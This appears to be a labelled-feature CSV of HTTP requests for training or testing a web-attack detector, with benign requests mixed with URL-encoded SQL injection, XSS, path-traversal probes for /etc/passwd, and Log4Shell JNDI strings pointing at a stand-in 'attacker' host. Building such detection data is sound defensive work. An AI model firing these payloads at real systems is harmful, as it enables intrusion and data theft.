method,path,body,single_q,double_q,dashes,braces,spaces,badwords
GET,/reviews/post?id=29,,0,0,0,0,0,0
POST,/organization/team?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/dashboard/overview,product=123&type=info,0,0,0,0,0,0
GET,/blog/archive/2023,,0,0,0,0,0,0
POST,/events,uname=test&pass=test,0,0,0,0,0,0
GET,/offers?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/admin/settings?q=sleep%285%29,,0,0,0,1,0,2
GET,/search?cat=electronics,,0,0,0,0,0,0
GET,/pricing.html,,0,0,0,0,0,0
GET,/sports,,0,0,0,0,0,0
GET,/languages/english,,0,0,0,0,0,0
POST,/dashboard/overview,id=55,0,0,0,0,0,0
GET,/user/profile?id=2,,0,0,0,0,0,0
POST,/admin/logs,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/pricing.html,,0,0,0,0,0,0
POST,/products/list,uemail=test@example.com,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
GET,/user/notifications,,0,0,0,0,0,0
GET,/docs/api?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/api/v2/login,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/organization?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/stocks/market?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/store/phones,product=123&type=info,0,0,0,0,0,0
GET,/languages/english,,0,0,0,0,0,0
POST,/help/contact,uname=test&pass=test,0,0,0,0,0,0
POST,/subscribe?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
POST,/blog/post1?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/auth/logout,,0,0,0,0,0,0
GET,/forum/post?id=1?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/billing/payment-methods,product=123&type=info,0,0,0,0,0,0
GET,/dashboard/overview,,0,0,0,0,0,0
POST,/store/phones,,0,0,0,0,0,0
POST,/support,id=55,0,0,0,0,0,0
POST,/downloads/pdf?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/locations/usa,,0,0,0,0,0,0
POST,/forum/post?id=2,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/blog/archive/2023,,0,0,0,0,0,0
POST,/api/v3/messages,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/playlists/trending,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/books/read?id=100?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/store/cameras,uemail=test@example.com,0,0,0,0,0,0
POST,/account/security,comment=Nice+product,0,0,0,0,1,0
GET,/analytics,,0,0,0,0,0,0
POST,/subscribe,comment=Nice+product,0,0,0,0,1,0
POST,/api/v2/register,,0,0,0,0,0,0
POST,/university/courses,product=123&type=info,0,0,0,0,0,0
GET,/books?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/assets/css/main.css,id=55,0,0,0,0,0,0
GET,/auth/reset-password?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/movies/popular?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/settings/billing?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/sports?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/settings/profile?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/careers/jobs?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/organization/about,id=55,0,0,0,0,0,0
POST,/gallery?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/blog/post1,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/blog/archive/2023,,0,0,0,0,0,0
GET,/blog/post3?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/faq?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/forum/category/coding?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/crypto/coin?id=ETH,,0,0,0,0,0,0
POST,/library/book?id=10,,0,0,0,0,0,0
GET,/auth/register,,0,0,0,0,0,0
POST,/gallery,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/forum/threads?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/gallery/photos?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/products?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/auth/reset-password?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/user/settings,,0,0,0,0,0,0
POST,/restaurants/view?id=23,id=55,0,0,0,0,0,0
GET,/subscribe,,0,0,0,0,0,0
POST,/locations/europe,uname=test&pass=test,0,0,0,0,0,0
POST,/api/v1/orders,comment=Nice+product,0,0,0,0,1,0
GET,/user/wishlist/add?id=98?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/movies/popular,uname=test&pass=test,0,0,0,0,0,0
POST,/docs/api,uemail=test@example.com,0,0,0,0,0,0
POST,/settings/billing?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/docs/api,uname=test&pass=test,0,0,0,0,0,0
GET,/help/how-to-order,,0,0,0,0,0,0
POST,/library,product=123&type=info,0,0,0,0,0,0
GET,/blog/category/security,,0,0,0,0,0,0
POST,/store/laptops,comment=Nice+product,0,0,0,0,1,0
POST,/analytics/sales?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/feedback/submit,id=55,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/dashboard/overview?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/docs/examples?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/store/cameras,,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/static/script.js,,0,0,0,0,0,1
POST,/news,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/downloads/pdf?id=1,,0,0,0,0,0,0
GET,/travel/flights,,0,0,0,0,0,0
POST,/dashboard/overview,uemail=test@example.com,0,0,0,0,0,0
GET,/search?cat=electronics,,0,0,0,0,0,0
POST,/inbox?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/auth/register,,0,0,0,0,0,0
POST,/travel/hotels,uname=test&pass=test,0,0,0,0,0,0
GET,/appointments/book,,0,0,0,0,0,0
POST,/terms-and-conditions?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/newsfeed,uemail=test@example.com,0,0,0,0,0,0
POST,/products,id=55,0,0,0,0,0,0
GET,/user/orders,,0,0,0,0,0,0
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
POST,/careers,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/subscriptions/manage?q=admin%27+--,,1,0,1,0,1,1
POST,/api/v1/orders,product=123&type=info,0,0,0,0,0,0
GET,/careers?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/careers/jobs?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/analytics/traffic,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/forum/post?id=1,,0,0,0,0,0,0
GET,/api/v1/users/1?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/gallery/photos?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/user/profile?id=1,,0,0,0,0,0,0
POST,/playlists/mixes?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/projects/list?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/docs/setup,,0,0,0,0,0,0
POST,/docs/introduction?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/home.php,,0,0,0,0,0,0
GET,/user/wishlist,,0,0,0,0,0,0
GET,/travel/offers,,0,0,0,0,0,0
GET,/billing/history,,0,0,0,0,0,0
GET,/newsfeed/today,,0,0,0,0,0,0
GET,/docs/setup?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/offers,product=123&type=info,0,0,0,0,0,0
POST,/books,comment=Nice+product,0,0,0,0,1,0
POST,/assets/images/logo.png,,0,0,0,0,0,0
GET,/inbox/messages?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/auth/reset-password?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/admin/settings?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/subscriptions,,0,0,0,0,0,1
POST,/stocks/market,product=123&type=info,0,0,0,0,0,0
POST,/events/upcoming,uname=test&pass=test,0,0,0,0,0,0
GET,/news,,0,0,0,0,0,0
POST,/languages/english?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/promo,,0,0,0,0,0,0
GET,/restaurants,,0,0,0,0,0,0
POST,/auth/logout,,0,0,0,0,0,0
POST,/forum/post?id=1,,0,0,0,0,0,0
GET,/user/orders,,0,0,0,0,0,0
POST,/search?page=3,uname=test&pass=test,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
GET,/docs/setup,,0,0,0,0,0,0
GET,/api/v3/settings?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/playlists/mixes,,0,0,0,0,0,0
GET,/books/bestsellers,,0,0,0,0,0,0
GET,/products/trending,,0,0,0,0,0,0
POST,/projects/view?id=8,uname=test&pass=test,0,0,0,0,0,0
POST,/crypto,uemail=test@example.com,0,0,0,0,0,0
POST,/admin/users,,0,0,0,0,0,0
GET,/assets/css/main.css,,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/organization?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/reviews/post?id=29,,0,0,0,0,0,0
GET,/billing/history?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/user/messages,uname=test&pass=test,0,0,0,0,0,0
POST,/privacy-policy?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/products/filter?price=high,,0,0,0,0,0,0
GET,/index.html,,0,0,0,0,0,0
GET,/partners,,0,0,0,0,0,0
POST,/docs/setup,uname=test&pass=test,0,0,0,0,0,0
GET,/dashboard/overview,,0,0,0,0,0,0
POST,/store/phones,uemail=test@example.com,0,0,0,0,0,0
POST,/store/cameras,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/settings/preferences,,0,0,0,0,0,0
GET,/billing/invoice?id=55,,0,0,0,0,0,0
POST,/subscribe?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/auth/login,product=123&type=info,0,0,0,0,0,0
POST,/promo/winter,uemail=test@example.com,0,0,0,0,0,0
POST,/store/cart,uemail=test@example.com,0,0,0,0,0,0
GET,/page/1?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/user/cart?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/feedback/form,,0,0,0,0,0,0
POST,/user/wishlist,id=55,0,0,0,0,0,0
GET,/library/books,,0,0,0,0,0,0
POST,/static/style.css?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/auth/logout,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/about.html?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/products/list?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/search?page=1,,0,0,0,0,0,0
GET,/auth/verify-email?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/api/v2/auth,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/music/playlist?id=4?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/terms-and-conditions,id=55,0,0,0,0,0,0
POST,/faq,id=55,0,0,0,0,0,0
POST,/category/home-appliances?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/help/faq?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/category/sports,,0,0,0,0,0,0
GET,/user/messages,,0,0,0,0,0,0
POST,/account/history,uname=test&pass=test,0,0,0,0,0,0
GET,/search?cat=electronics?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/privacy-policy,comment=Nice+product,0,0,0,0,1,0
GET,/assets/images/logo.png,,0,0,0,0,0,0
GET,/settings/security,,0,0,0,0,0,0
GET,/products/trending,,0,0,0,0,0,0
GET,/movies?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/user/settings,product=123&type=info,0,0,0,0,0,0
GET,/checkout,,0,0,0,0,0,0
POST,/weather/today?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
GET,/unsubscribe?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/pricing.html?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/store,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/billing/invoice?id=55?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/docs/api,,0,0,0,0,0,0
GET,/search?cat=fashion?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/terms-and-conditions,comment=Nice+product,0,0,0,0,1,0
GET,/dashboard/stats,,0,0,0,0,0,0
POST,/auth/logout,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/search?page=1,,0,0,0,0,0,0
POST,/page/4,comment=Nice+product,0,0,0,0,1,0
GET,/forum/threads,,0,0,0,0,0,0
POST,/admin/users,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/user/wishlist,,0,0,0,0,0,0
POST,/products/view?id=1?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/projects/view?id=8?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/blog/category/lifestyle,,0,0,0,0,0,0
GET,/api/v2/orders?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/page/2,id=55,0,0,0,0,0,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
GET,/store/cart?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/events/past?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/index.php,,0,0,0,0,0,0
POST,/search?page=1?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/subscribe,,0,0,0,0,0,0
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/organization/about,,0,0,0,0,0,0
POST,/api/v2/login,id=55,0,0,0,0,0,0
GET,/blog/post2,,0,0,0,0,0,0
POST,/auth/verify-email?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/movies,,0,0,0,0,0,0
GET,/index.php,,0,0,0,0,0,0
POST,/inbox/messages,uname=test&pass=test,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
POST,/static/script.js,uaddress=21+street&update=update,0,0,0,0,1,5
POST,/orders/detail?id=100,comment=Nice+product,0,0,0,0,1,0
GET,/support,,0,0,0,0,0,0
GET,/products/filter?price=low,,0,0,0,0,0,0
POST,/products/view?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/weather/week?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/forum/category/coding,,0,0,0,0,0,0
POST,/search?cat=electronics,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/analytics/sales,uemail=test@example.com,0,0,0,0,0,0
GET,/products/new?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/api/v3/settings,comment=Nice+product,0,0,0,0,1,0
POST,/products/filter?cat=women,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/orders/list,uemail=test@example.com,0,0,0,0,0,0
POST,/products/view?id=2,uname=test&pass=test,0,0,0,0,0,0
GET,/category/sports,,0,0,0,0,0,0
POST,/offers,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/admin/settings?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
GET,/search?q=laptops,,0,0,0,0,0,0
POST,/admin/dashboard,product=123&type=info,0,0,0,0,0,0
GET,/admin/users,,0,0,0,0,0,0
GET,/api/v3/messages?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/settings/profile,,0,0,0,0,0,0
GET,/movies,,0,0,0,0,0,0
GET,/appointments/book,,0,0,0,0,0,0
GET,/blog/post3,,0,0,0,0,0,0
POST,/organization/team,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/search?q=laptops?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/products/reviews?id=10,,0,0,0,0,0,0
GET,/university/course?id=20,,0,0,0,0,0,0
GET,/products/related?id=10,,0,0,0,0,0,0
GET,/sports/cricket?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/checkout,,0,0,0,0,0,0
POST,/products/filter?cat=men,uname=test&pass=test,0,0,0,0,0,0
POST,/support/chat,comment=Nice+product,0,0,0,0,1,0
POST,/playlists/mixes,,0,0,0,0,0,0
GET,/products/view?id=1,,0,0,0,0,0,0
GET,/user/profile?id=3,,0,0,0,0,0,0
POST,/locations/usa,,0,0,0,0,0,0
POST,/playlists/trending?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/dashboard/stats,,0,0,0,0,0,0
GET,/api/v1/orders?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/billing/invoice?id=55?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/blog,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
GET,/user/settings,,0,0,0,0,0,0
GET,/category/fashion,,0,0,0,0,0,0
POST,/products/view?id=1,id=55,0,0,0,0,0,0
POST,/weather/city?name=Delhi?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/contact.html,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/admin/logs?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
POST,/store/checkout,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
POST,/assets/css/main.css,comment=Nice+product,0,0,0,0,1,0
POST,/feedback/submit?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/admin/logs,,0,0,0,0,0,0
POST,/downloads,product=123&type=info,0,0,0,0,0,0
GET,/forum/threads,,0,0,0,0,0,0
POST,/category/sports,comment=Nice+product,0,0,0,0,1,0
POST,/docs/tutorials,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/assets/js/config.js,,0,0,0,0,0,0
GET,/index.php,,0,0,0,0,0,0
POST,/search?q=mobiles,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/promo/winter?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/help/faq,id=55,0,0,0,0,0,0
GET,/api/v1/categories,,0,0,0,0,0,0
POST,/partners/apply,comment=Nice+product,0,0,0,0,1,0
POST,/blog/archive/2023,id=55,0,0,0,0,0,0
POST,/news/trending,uname=test&pass=test,0,0,0,0,0,0
POST,/auth/verify-email?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/university/courses,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/index.html?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/organization/about,,0,0,0,0,0,0
GET,/assets/js/config.js,,0,0,0,0,0,0
GET,/offers?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/category/sports,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/tickets/open,product=123&type=info,0,0,0,0,0,0
POST,/billing/payment-methods,comment=Nice+product,0,0,0,0,1,0
GET,/assets/images/banner.jpg?q=sleep%285%29,,0,0,0,1,0,2
POST,/news,id=55,0,0,0,0,0,0
POST,/static/style.css,product=123&type=info,0,0,0,0,0,0
POST,/playlists/mixes,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/static/main.js?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/api/v1/users/2?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/services.php,,0,0,0,0,0,0
GET,/subscribe,,0,0,0,0,0,0
GET,/api/v2/register?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/travel/offers,,0,0,0,0,0,0
POST,/privacy-policy,uemail=test@example.com,0,0,0,0,0,0
GET,/page/4?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/analytics/sales?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/dashboard/overview,uemail=test@example.com,0,0,0,0,0,0
GET,/analytics,,0,0,0,0,0,0
POST,/locations/europe?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/user/profile?id=1,product=123&type=info,0,0,0,0,0,0
POST,/checkout/payment,product=123&type=info,0,0,0,0,0,0
GET,/forum/post?id=1,,0,0,0,0,0,0
GET,/user/messages?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/user/wishlist/add?id=98?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/languages?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/assets/css/main.css?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/analytics,,0,0,0,0,0,0
GET,/category/fashion?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/static/script.js,,0,0,0,0,0,1
GET,/playlists,,0,0,0,0,0,0
POST,/reviews,comment=Nice+product,0,0,0,0,1,0
GET,/organization/team?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/blog/category/tech,,0,0,0,0,0,0
POST,/downloads/app?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/tickets/open?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/university,,0,0,0,0,0,0
POST,/news/world,comment=Nice+product,0,0,0,0,1,0
GET,/gallery,,0,0,0,0,0,0
GET,/feedback,,0,0,0,0,0,0
POST,/store/cart?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/support/ticket,,0,0,0,0,0,0
GET,/search?page=3,,0,0,0,0,0,0
POST,/api/v1/users/2?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/music,,0,0,0,0,0,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
POST,/weather/week,comment=Nice+product,0,0,0,0,1,0
POST,/api/v1/users/2,uname=test&pass=test,0,0,0,0,0,0
POST,/contact.php,product=123&type=info,0,0,0,0,0,0
GET,/reviews/post?id=29,,0,0,0,0,0,0
GET,/docs/examples,,0,0,0,0,0,0
POST,/news/world,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/news/world?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/docs/setup,,0,0,0,0,0,0
POST,/static/app.js,comment=Nice+product,0,0,0,0,1,0
POST,/travel/offers?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/search?cat=electronics?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
POST,/auth/logout?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/events/upcoming,,0,0,0,0,0,0
POST,/api/v2/auth,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/playlists,,0,0,0,0,0,0
POST,/services.html,product=123&type=info,0,0,0,0,0,0
GET,/contact.html,,0,0,0,0,0,0
GET,/user,,0,0,0,0,0,0
GET,/api/v1/users,,0,0,0,0,0,0
POST,/news/latest,id=55,0,0,0,0,0,0
POST,/checkout,uname=test&pass=test,0,0,0,0,0,0
POST,/store?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/store/cameras,,0,0,0,0,0,0
POST,/orders/list?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/contact.html,,0,0,0,0,0,0
GET,/blog/post3,,0,0,0,0,0,0
POST,/appointments/book,id=55,0,0,0,0,0,0
GET,/library/book?id=10?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/search?cat=electronics,,0,0,0,0,0,0
GET,/stocks/company?id=TCS,,0,0,0,0,0,0
POST,/services.php,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/languages,product=123&type=info,0,0,0,0,0,0
GET,/user/profile?id=2,,0,0,0,0,0,0
GET,/user/notifications?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/products/list,,0,0,0,0,0,0
